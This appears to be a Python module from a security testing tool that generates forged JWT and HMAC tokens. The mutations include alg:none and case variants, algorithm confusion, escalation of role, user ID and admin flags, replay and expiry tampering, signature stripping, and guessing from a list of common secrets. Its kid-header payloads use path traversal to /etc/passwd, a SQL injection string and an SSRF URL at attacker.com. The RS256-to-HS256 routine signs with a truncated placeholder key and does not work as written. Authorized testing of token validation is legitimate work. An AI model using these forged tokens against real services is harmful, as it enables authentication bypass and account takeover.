"""
mutator.py - Token Mutation Engine

Generates all variants of JWT and HMAC tokens for security testing.
Implements: Algorithm Substitution, Payload Tampering, Replay,
            Expiration Manipulation, HMAC-Specific attacks.
"""

import base64
import hashlib
import hmac
import json
import time
import copy
from typing import Optional, List, Any
from datetime import datetime, timedelta, timezone
from pathlib import Path

from rich.console import Console

console = Console()

# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

COMMON_HMAC_SECRETS = [
    "secret", "password", "123456", "admin", "key", "test",
    "qwerty", "letmein", "changeme", "mysecret", "jwt_secret",
    "your-256-bit-secret", "supersecret", "api_key", "token_secret",
    "hs256", "jwtkey", "app_secret", "dev_secret", "prod_secret",
    "secret123", "abc123", "p@ssword", "S3cr3t!", "myapp",
    "", " ",  # empty / blank
]


def _b64url_encode(data: bytes) -> str:
    """Base64URL encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    """Base64URL decode with padding fix and robust error handling."""
    if not isinstance(s, str):
        s = str(s)
    s = s.strip()
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    try:
        return base64.urlsafe_b64decode(s.encode("ascii"))
    except Exception:
        # Fallback for non-standard formats
        return base64.urlsafe_b64decode(s)


def _jwt_parts(token: str):
    """Split JWT into (header_dict, payload_dict, signature_bytes, raw_parts)."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT: expected 3 parts, got {len(parts)}")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig = _b64url_decode(parts[2]) if parts[2] else b""
    return header, payload, sig, parts


def _forge_jwt(header: dict, payload: dict, secret: Optional[str] = None,
               alg: Optional[str] = None) -> str:
    """
    Forge a JWT. If alg is 'none', produces unsigned token.
    If secret is provided and alg starts with 'HS', HMAC-signs it.
    Otherwise produces token with empty/zeroed signature.
    """
    alg = alg or header.get("alg", "none")
    header = dict(header)
    header["alg"] = alg

    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()

    if alg.lower() == "none":
        return f"{h}.{p}."

    if alg.startswith("HS") and secret is not None:
        bits = int(alg[2:])
        digest = {256: hashlib.sha256, 384: hashlib.sha384, 512: hashlib.sha512}.get(bits, hashlib.sha256)
        sig = hmac.new(secret.encode(), signing_input, digest).digest()
        return f"{h}.{p}.{_b64url_encode(sig)}"

    # No valid signing — return with empty signature (tests if server validates)
    return f"{h}.{p}."


# ─────────────────────────────────────────────────────────────────────────────
# JWT Mutator
# ─────────────────────────────────────────────────────────────────────────────

class JWTMutator:
    """
    Generates all JWT mutation variants for security testing.

    Mutations implemented:
      1. Algorithm Substitution (alg:none, RS256→HS256, HS256→RS256)
      2. Payload Tampering (role/ID escalation, claim injection)
      3. Replay (timestamp/nonce manipulation)
      4. Expiration Manipulation (exp past/future, iat future)
      5. Signature Stripping / Corruption
    """

    def __init__(self, token: str, verbose: bool = False):
        """
        Initialize with a valid JWT token string.

        Args:
            token: Base64url-encoded JWT string (header.payload.signature)
            verbose: Enable verbose debug output
        """
        self.token = token
        self.verbose = verbose
        try:
            self.header, self.payload, self.signature, self.parts = _jwt_parts(token)
        except Exception as e:
            raise ValueError(f"Cannot parse JWT: {e}")

        if verbose:
            console.print(f"[dim]JWT Header: {self.header}[/dim]")
            console.print(f"[dim]JWT Payload keys: {list(self.payload.keys())}[/dim]")

    # ── 1. Algorithm Substitution ────────────────────────────────────────────

    def mut_alg_none(self) -> dict:
        """Set alg to 'none' to bypass signature verification."""
        h = dict(self.header)
        h["alg"] = "none"
        token = _forge_jwt(h, self.payload, alg="none")
        return {
            "name": "alg:none — Algorithm Substitution",
            "category": "Algorithm Substitution",
            "token": token,
            "description": "Set algorithm to 'none' to bypass signature verification entirely.",
            "severity_hint": "CRITICAL",
            "mutation_detail": {"original_alg": self.header.get("alg"), "new_alg": "none"}
        }

    def mut_alg_none_uppercase(self) -> dict:
        """Variation: 'NONE', 'None', 'nOnE' to bypass case-sensitive checks."""
        results = []
        for variant in ["NONE", "None", "nOnE", "NoNe"]:
            h = dict(self.header)
            h["alg"] = variant
            p = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
            pl = _b64url_encode(json.dumps(self.payload, separators=(",", ":")).encode())
            results.append({
                "name": f"alg:{variant} — Case Variant",
                "category": "Algorithm Substitution",
                "token": f"{p}.{pl}.",
                "description": f"Use '{variant}' to bypass case-sensitive 'none' check.",
                "severity_hint": "HIGH",
                "mutation_detail": {"variant": variant}
            })
        return results

    def mut_rs256_to_hs256(self) -> dict:
        """
        RS256 → HS256 confusion attack.
        Signs with RS256 public key as HMAC secret.
        Common when server uses public key as-is for HMAC verification.
        """
        # Simulate: use a placeholder public key as secret
        fake_public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA..."
        h = dict(self.header)
        h["alg"] = "HS256"
        token = _forge_jwt(h, self.payload, secret=fake_public_key, alg="HS256")
        return {
            "name": "RS256→HS256 Algorithm Confusion",
            "category": "Algorithm Substitution",
            "token": token,
            "description": "Change alg to HS256 and sign with RS256 public key as HMAC secret.",
            "severity_hint": "CRITICAL",
            "mutation_detail": {"original": "RS256", "attack": "HS256_with_public_key"}
        }

    def mut_hs256_to_rs256(self) -> dict:
        """Switch from HS256 to RS256 to confuse server into using wrong key."""
        h = dict(self.header)
        original_alg = h.get("alg", "HS256")
        h["alg"] = "RS256"
        token = _forge_jwt(h, self.payload, alg="RS256")
        return {
            "name": "HS256→RS256 Algorithm Confusion",
            "category": "Algorithm Substitution",
            "token": token,
            "description": "Switch to RS256 to see if server accepts mismatched algorithm.",
            "severity_hint": "HIGH",
            "mutation_detail": {"original": original_alg, "switched_to": "RS256"}
        }

    def mut_alg_missing(self) -> dict:
        """Remove 'alg' field entirely from header."""
        h = dict(self.header)
        h.pop("alg", None)
        token = _forge_jwt(h, self.payload, alg="none")
        return {
            "name": "Missing alg Header",
            "category": "Algorithm Substitution",
            "token": token,
            "description": "Remove algorithm field from JWT header.",
            "severity_hint": "MEDIUM",
            "mutation_detail": {"removed_field": "alg"}
        }

    # ── 2. Payload Tampering ─────────────────────────────────────────────────

    def mut_escalate_role(self) -> list:
        """Escalate role/privilege claims to admin equivalents."""
        mutations = []
        role_fields = ["role", "roles", "scope", "permissions", "group",
                       "user_type", "type", "access", "level"]
        admin_values = {
            "role": ["admin", "superadmin", "root", "administrator"],
            "roles": [["admin"], ["admin", "superadmin"]],
            "scope": ["admin:all", "read:admin write:admin"],
            "permissions": ["*", "admin"],
            "group": ["admins", "staff"],
            "user_type": ["admin", "staff"],
            "type": ["admin"],
            "access": ["full", "admin"],
            "level": [0, 9999, "admin"]
        }
        for field in role_fields:
            if field in self.payload:
                for new_val in admin_values.get(field, ["admin"])[:2]:
                    p = copy.deepcopy(self.payload)
                    original = p[field]
                    p[field] = new_val
                    h = dict(self.header)
                    h["alg"] = "none"
                    token = _forge_jwt(h, p, alg="none")
                    mutations.append({
                        "name": f"Role Escalation: {field}={new_val}",
                        "category": "Payload Tampering",
                        "token": token,
                        "description": f"Changed {field} from '{original}' to '{new_val}' with alg:none.",
                        "severity_hint": "CRITICAL",
                        "mutation_detail": {"field": field, "original": original, "new": new_val}
                    })

        # Try adding role even if not present
        for field in role_fields[:3]:
            if field not in self.payload:
                p = copy.deepcopy(self.payload)
                p[field] = "admin"
                h = dict(self.header)
                h["alg"] = "none"
                token = _forge_jwt(h, p, alg="none")
                mutations.append({
                    "name": f"Role Injection: add {field}=admin",
                    "category": "Payload Tampering",
                    "token": token,
                    "description": f"Injected new claim {field}=admin.",
                    "severity_hint": "HIGH",
                    "mutation_detail": {"injected_field": field, "value": "admin"}
                })
        return mutations

    def mut_change_user_id(self) -> list:
        """Change user ID/sub claims to common admin values."""
        mutations = []
        id_fields = ["sub", "user_id", "uid", "id", "userId", "user"]
        admin_ids = ["1", "0", "admin", "root", "superadmin", "-1", "null"]

        for field in id_fields:
            if field in self.payload:
                original = self.payload[field]
                for new_id in admin_ids[:3]:
                    p = copy.deepcopy(self.payload)
                    p[field] = new_id
                    h = dict(self.header)
                    h["alg"] = "none"
                    token = _forge_jwt(h, p, alg="none")
                    mutations.append({
                        "name": f"User ID Tampering: {field}→{new_id}",
                        "category": "Payload Tampering",
                        "token": token,
                        "description": f"Changed {field} from '{original}' to '{new_id}'.",
                        "severity_hint": "HIGH",
                        "mutation_detail": {"field": field, "original": original, "new": new_id}
                    })
        return mutations

    def mut_add_admin_claim(self) -> list:
        """Add 'is_admin', 'admin', 'superuser' boolean flags."""
        mutations = []
        flags = [("is_admin", True), ("admin", True), ("superuser", True),
                 ("isAdmin", True), ("is_staff", True), ("privileged", True)]
        for field, val in flags:
            if field not in self.payload:
                p = copy.deepcopy(self.payload)
                p[field] = val
                h = dict(self.header)
                h["alg"] = "none"
                token = _forge_jwt(h, p, alg="none")
                mutations.append({
                    "name": f"Admin Flag Injection: {field}=true",
                    "category": "Payload Tampering",
                    "token": token,
                    "description": f"Injected {field}=true into payload.",
                    "severity_hint": "HIGH",
                    "mutation_detail": {"injected": {field: val}}
                })
        return mutations

    def mut_delete_claims(self) -> list:
        """Remove security-critical claims (email_verified, mfa, etc.)."""
        sensitive = ["email_verified", "mfa", "two_factor", "verified",
                     "approved", "active", "enabled"]
        mutations = []
        for claim in sensitive:
            if claim in self.payload and not self.payload[claim]:
                p = copy.deepcopy(self.payload)
                del p[claim]
                h = dict(self.header)
                h["alg"] = "none"
                token = _forge_jwt(h, p, alg="none")
                mutations.append({
                    "name": f"Claim Deletion: remove {claim}",
                    "category": "Payload Tampering",
                    "token": token,
                    "description": f"Removed verification claim '{claim}'.",
                    "severity_hint": "MEDIUM",
                    "mutation_detail": {"deleted_claim": claim}
                })
        return mutations

    # ── 3. Replay Attacks ────────────────────────────────────────────────────

    def mut_replay_with_new_iat(self) -> dict:
        """Replay token with refreshed iat (issued-at) timestamp."""
        p = copy.deepcopy(self.payload)
        old_iat = p.get("iat", int(time.time()))
        p["iat"] = int(time.time())
        if "nbf" in p:
            p["nbf"] = int(time.time())
        h = dict(self.header)
        h["alg"] = "none"
        token = _forge_jwt(h, p, alg="none")
        return {
            "name": "Replay: Refreshed iat Timestamp",
            "category": "Replay",
            "token": token,
            "description": "Reused valid token structure with updated iat to bypass replay protection.",
            "severity_hint": "HIGH",
            "mutation_detail": {"old_iat": old_iat, "new_iat": p["iat"]}
        }

    def mut_replay_remove_jti(self) -> dict:
        """Remove JWT ID (jti) to bypass per-token replay protection."""
        p = copy.deepcopy(self.payload)
        had_jti = "jti" in p
        p.pop("jti", None)
        h = dict(self.header)
        h["alg"] = "none"
        token = _forge_jwt(h, p, alg="none")
        return {
            "name": "Replay: Remove jti (JWT ID)",
            "category": "Replay",
            "token": token,
            "description": "Removed jti claim to potentially bypass per-token replay protection.",
            "severity_hint": "MEDIUM",
            "mutation_detail": {"had_jti": had_jti}
        }

    # ── 4. Expiration Manipulation ───────────────────────────────────────────

    def mut_exp_past(self) -> dict:
        """Set exp to the past (1 second after epoch) — tests if exp is validated."""
        p = copy.deepcopy(self.payload)
        p["exp"] = 1  # Unix epoch + 1s — clearly expired
        h = dict(self.header)
        h["alg"] = "none"
        token = _forge_jwt(h, p, alg="none")
        return {
            "name": "Expiration: Set exp=1 (Epoch Past)",
            "category": "Expiration Manipulation",
            "token": token,
            "description": "Token expired in 1970 — tests if server validates exp claim.",
            "severity_hint": "HIGH",
            "mutation_detail": {"exp": 1}
        }

    def mut_exp_distant_future(self) -> dict:
        """Set exp 100 years in the future — tests if any expiry is enforced."""
        future = int((datetime.now(timezone.utc) + timedelta(days=36500)).timestamp())
        p = copy.deepcopy(self.payload)
        p["exp"] = future
        h = dict(self.header)
        h["alg"] = "none"
        token = _forge_jwt(h, p, alg="none")
        return {
            "name": "Expiration: exp=+100 Years (No Expiry Policy)",
            "category": "Expiration Manipulation",
            "token": token,
            "description": "Token valid for 100 years — tests for missing expiry enforcement.",
            "severity_hint": "MEDIUM",
            "mutation_detail": {"exp": future}
        }

    def mut_exp_removed(self) -> dict:
        """Remove exp claim entirely."""
        p = copy.deepcopy(self.payload)
        had_exp = "exp" in p
        p.pop("exp", None)
        h = dict(self.header)
        h["alg"] = "none"
        token = _forge_jwt(h, p, alg="none")
        return {
            "name": "Expiration: Remove exp Claim",
            "category": "Expiration Manipulation",
            "token": token,
            "description": "Removed exp claim — tests if server requires expiry.",
            "severity_hint": "HIGH",
            "mutation_detail": {"had_exp": had_exp}
        }

    def mut_iat_future(self) -> dict:
        """Set iat to far future (clock skew / issued in future)."""
        future_iat = int((datetime.now(timezone.utc) + timedelta(days=365)).timestamp())
        p = copy.deepcopy(self.payload)
        p["iat"] = future_iat
        h = dict(self.header)
        h["alg"] = "none"
        token = _forge_jwt(h, p, alg="none")
        return {
            "name": "Expiration: iat=Future (Issued In Future)",
            "category": "Expiration Manipulation",
            "token": token,
            "description": "Set iat to future — tests for iat validation.",
            "severity_hint": "LOW",
            "mutation_detail": {"iat": future_iat}
        }

    def mut_nbf_future(self) -> dict:
        """Set nbf (not-before) to future — token not yet valid."""
        future_nbf = int((datetime.now(timezone.utc) + timedelta(hours=24)).timestamp())
        p = copy.deepcopy(self.payload)
        p["nbf"] = future_nbf
        h = dict(self.header)
        h["alg"] = "none"
        token = _forge_jwt(h, p, alg="none")
        return {
            "name": "Expiration: nbf=Future (Not Yet Valid)",
            "category": "Expiration Manipulation",
            "token": token,
            "description": "Token not yet valid per nbf — tests if nbf is enforced.",
            "severity_hint": "LOW",
            "mutation_detail": {"nbf": future_nbf}
        }

    # ── 5. Signature Manipulation ────────────────────────────────────────────

    def mut_empty_signature(self) -> dict:
        """Remove signature entirely (keep trailing dot)."""
        h_raw, p_raw = self.parts[0], self.parts[1]
        token = f"{h_raw}.{p_raw}."
        return {
            "name": "Signature: Empty (Stripped)",
            "category": "Signature Manipulation",
            "token": token,
            "description": "Completely stripped signature — tests for signature presence check.",
            "severity_hint": "CRITICAL",
            "mutation_detail": {"technique": "signature_stripped"}
        }

    def mut_corrupted_signature(self) -> dict:
        """Replace signature with invalid bytes."""
        h_raw, p_raw = self.parts[0], self.parts[1]
        fake_sig = _b64url_encode(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
        token = f"{h_raw}.{p_raw}.{fake_sig}"
        return {
            "name": "Signature: Corrupted/Zeroed",
            "category": "Signature Manipulation",
            "token": token,
            "description": "Replaced signature with zeroed bytes — tests for signature validation.",
            "severity_hint": "HIGH",
            "mutation_detail": {"technique": "signature_zeroed"}
        }

    def mut_kid_injection(self) -> list:
        """Inject key ID (kid) pointing to attacker-controlled key."""
        mutations = []
        injections = [
            ("../../../dev/null", "Path traversal to /dev/null"),
            ("../../etc/passwd", "Path traversal to /etc/passwd"),
            ("x' OR '1'='1", "SQL injection in kid"),
            ("http://attacker.com/key.pem", "SSRF via kid URL"),
            ("none", "kid pointing to 'none'"),
        ]
        for val, desc in injections:
            h = dict(self.header)
            h["kid"] = val
            h["alg"] = "none"
            token = _forge_jwt(h, self.payload, alg="none")
            mutations.append({
                "name": f"kid Injection: {val[:30]}",
                "category": "Signature Manipulation",
                "token": token,
                "description": f"kid header injection: {desc}",
                "severity_hint": "HIGH",
                "mutation_detail": {"kid": val, "technique": desc}
            })
        return mutations

    def generate_all_mutations(self) -> list:
        """Generate the complete set of JWT mutations."""
        mutations = []

        # Algorithm substitution
        mutations.append(self.mut_alg_none())
        mutations.extend(self.mut_alg_none_uppercase())
        mutations.append(self.mut_rs256_to_hs256())
        mutations.append(self.mut_hs256_to_rs256())
        mutations.append(self.mut_alg_missing())

        # Payload tampering
        mutations.extend(self.mut_escalate_role())
        mutations.extend(self.mut_change_user_id())
        mutations.extend(self.mut_add_admin_claim())
        mutations.extend(self.mut_delete_claims())

        # Replay
        mutations.append(self.mut_replay_with_new_iat())
        mutations.append(self.mut_replay_remove_jti())

        # Expiration manipulation
        mutations.append(self.mut_exp_past())
        mutations.append(self.mut_exp_distant_future())
        mutations.append(self.mut_exp_removed())
        mutations.append(self.mut_iat_future())
        mutations.append(self.mut_nbf_future())

        # Signature manipulation
        mutations.append(self.mut_empty_signature())
        mutations.append(self.mut_corrupted_signature())
        mutations.extend(self.mut_kid_injection())

        return mutations


# ─────────────────────────────────────────────────────────────────────────────
# HMAC Mutator
# ─────────────────────────────────────────────────────────────────────────────

class HMACMutator:
    """
    Generates HMAC signature mutation variants for security testing.

    Assumes the token format: message.signature (base64url)
    Or a raw signed request with Authorization: HMAC token.

    Mutations:
      1. Weak secret guessing from common list
      2. Signature truncation (first N bytes)
      3. Signature stripping (no signature at all)
      4. Empty/null signature
      5. Algorithm downgrade (SHA256 → SHA1 → MD5)
      6. Payload/message tampering with re-signing
      7. Replay with modified timestamp/nonce
    """
    def __init__(self, token: str, secret: Optional[str] = None, verbose: bool = False, wordlist: Optional[Any] = None):
        """
        Initialize with a valid HMAC-signed token.

        Args:
            token: The raw token string (message.signature or full Bearer value)
            secret: Known HMAC secret (optional — triggers brute-force if not given)
            verbose: Verbose logging
            wordlist: Path to a wordlist file or a list of secrets
        """
        self.token = token
        self.known_secret = secret
        self.verbose = verbose
        self.secrets = self._load_secrets(wordlist)
        self._parse_token()

    def _load_secrets(self, wordlist: Optional[Any] = None) -> List[str]:
        """Load secrets from hardcoded list, provided list, or file."""
        if isinstance(wordlist, list):
            return wordlist
        
        secrets = list(COMMON_HMAC_SECRETS)
        if wordlist and isinstance(wordlist, str):
            p = Path(wordlist)
            if p.exists() and p.is_file():
                try:
                    with open(p, "r", encoding="utf-8", errors="ignore") as f:
                        extra = [line.strip() for line in f if line.strip()]
                        secrets.extend(extra)
                        if self.verbose:
                            console.print(f"[dim]Loaded {len(extra)} secrets from {wordlist}[/dim]")
                except Exception as e:
                    if self.verbose:
                        console.print(f"[red]Error loading wordlist: {e}[/red]")
        
        return list(set(secrets))  # Unique only

    def _parse_token(self):
        """Parse HMAC token into message and signature parts."""
        if "." in self.token:
            parts = self.token.rsplit(".", 1)
            self.message = parts[0]
            try:
                self.signature = _b64url_decode(parts[1])
            except Exception:
                self.signature = parts[1].encode("utf-8", errors="replace")
        else:
            self.message = self.token
            self.signature = b""

    def _hmac_sign(self, message: str, secret: str, algorithm: str = "sha256") -> str:
        """Sign a message with given HMAC secret and algorithm."""
        algo_map = {
            "sha256": hashlib.sha256,
            "sha384": hashlib.sha384,
            "sha512": hashlib.sha512,
            "sha1": hashlib.sha1,
            "md5": hashlib.md5,
        }
        digestmod = algo_map.get(algorithm, hashlib.sha256)
        sig = hmac.new(secret.encode(), message.encode(), digestmod).digest()
        return _b64url_encode(sig)

    # ── 1. Weak Secret Guessing ──────────────────────────────────────────────

    def mut_weak_secret_guess(self) -> list:
        """Try to re-sign with each common or provided weak secret."""
        mutations = []
        for secret in self.secrets:
            new_sig = self._hmac_sign(self.message, secret)
            token = f"{self.message}.{new_sig}"
            mutations.append({
                "name": f"HMAC Weak Secret: '{secret[:20]}'",
                "category": "HMAC-Specific",
                "token": token,
                "description": f"Re-signed with guessed weak secret '{secret[:20]}'.",
                "severity_hint": "CRITICAL",
                "mutation_detail": {"guessed_secret": secret[:20], "algorithm": "sha256"}
            })
        return mutations

    # ── 2. Signature Truncation ──────────────────────────────────────────────

    def mut_signature_truncated(self) -> list:
        """Truncate signature to first N bytes — tests length validation."""
        mutations = []
        original_sig = _b64url_encode(self.signature) if self.signature else "AAAA"
        for length in [4, 8, 16, 1]:
            truncated = original_sig[:length]
            token = f"{self.message}.{truncated}"
            mutations.append({
                "name": f"HMAC Truncated Signature ({length} chars)",
                "category": "HMAC-Specific",
                "token": token,
                "description": f"Signature truncated to {length} characters — tests length validation.",
                "severity_hint": "HIGH",
                "mutation_detail": {"truncation_length": length}
            })
        return mutations

    # ── 3. Signature Stripping ───────────────────────────────────────────────

    def mut_signature_stripped(self) -> dict:
        """Remove signature entirely."""
        return {
            "name": "HMAC Signature Stripped",
            "category": "HMAC-Specific",
            "token": self.message,
            "description": "Sent message without any signature — tests if signature is required.",
            "severity_hint": "CRITICAL",
            "mutation_detail": {"technique": "signature_removed"}
        }

    def mut_empty_signature(self) -> dict:
        """Replace signature with empty string."""
        token = f"{self.message}."
        return {
            "name": "HMAC Empty Signature",
            "category": "HMAC-Specific",
            "token": token,
            "description": "Empty HMAC signature — tests null/empty signature acceptance.",
            "severity_hint": "CRITICAL",
            "mutation_detail": {"technique": "signature_empty"}
        }

    # ── 4. Algorithm Downgrade ───────────────────────────────────────────────

    def mut_algorithm_downgrade(self) -> list:
        """Downgrade HMAC algorithm to weaker variant (SHA1, MD5)."""
        mutations = []
        if self.known_secret:
            for algo in ["sha1", "md5", "sha384"]:
                new_sig = self._hmac_sign(self.message, self.known_secret, algo)
                token = f"{self.message}.{new_sig}"
                mutations.append({
                    "name": f"HMAC Algorithm Downgrade → {algo.upper()}",
                    "category": "HMAC-Specific",
                    "token": token,
                    "description": f"Re-signed with weaker {algo.upper()} — tests algorithm pinning.",
                    "severity_hint": "HIGH",
                    "mutation_detail": {"algorithm": algo, "secret": self.known_secret[:4] + "****"}
                })
        return mutations

    # ── 5. Payload Tampering ─────────────────────────────────────────────────

    def mut_payload_tamper(self) -> list:
        """
        Attempt to tamper with message payload (if JSON-parseable).
        Re-signs with known secret or leaves unsigned.
        """
        mutations = []
        try:
            payload = json.loads(self.message)
        except (json.JSONDecodeError, Exception):
            # Try base64-decode then parse
            try:
                decoded = _b64url_decode(self.message)
                payload = json.loads(decoded)
            except Exception:
                return mutations  # Not parseable, skip

        # Escalate role
        for field in ["role", "user_type", "access", "sub", "uid"]:
            if field in payload:
                new_payload = copy.deepcopy(payload)
                original = new_payload[field]
                new_payload[field] = "admin"
                new_message = json.dumps(new_payload, separators=(",", ":"))
                new_sig = (self._hmac_sign(new_message, self.known_secret)
                           if self.known_secret else _b64url_encode(b"tampered"))
                token = f"{new_message}.{new_sig}"
                mutations.append({
                    "name": f"HMAC Payload Tamper: {field}→admin",
                    "category": "Payload Tampering",
                    "token": token,
                    "description": f"Changed {field} from '{original}' to 'admin' in HMAC payload.",
                    "severity_hint": "CRITICAL",
                    "mutation_detail": {"field": field, "original": original, "new": "admin"}
                })

        return mutations

    # ── 6. Replay with Modified Nonce / Timestamp ────────────────────────────

    def mut_replay_modified_nonce(self) -> list:
        """Change nonce/timestamp in message to evade replay protection."""
        mutations = []
        try:
            payload = json.loads(self.message)
        except Exception:
            return mutations

        for ts_field in ["timestamp", "ts", "nonce", "request_id", "time"]:
            if ts_field in payload:
                new_payload = copy.deepcopy(payload)
                new_payload[ts_field] = int(time.time())
                new_message = json.dumps(new_payload, separators=(",", ":"))
                new_sig = (self._hmac_sign(new_message, self.known_secret)
                           if self.known_secret else _b64url_encode(b"replayed"))
                token = f"{new_message}.{new_sig}"
                mutations.append({
                    "name": f"HMAC Replay: Updated {ts_field}",
                    "category": "Replay",
                    "token": token,
                    "description": f"Updated {ts_field} to current time — replay with fresh timestamp.",
                    "severity_hint": "MEDIUM",
                    "mutation_detail": {"field": ts_field, "new_value": new_payload[ts_field]}
                })

        return mutations

    def generate_all_mutations(self) -> list:
        """Generate the complete set of HMAC mutations."""
        mutations = []

        mutations.extend(self.mut_weak_secret_guess())
        mutations.extend(self.mut_signature_truncated())
        mutations.append(self.mut_signature_stripped())
        mutations.append(self.mut_empty_signature())
        mutations.extend(self.mut_algorithm_downgrade())
        mutations.extend(self.mut_payload_tamper())
        mutations.extend(self.mut_replay_modified_nonce())

        return mutations
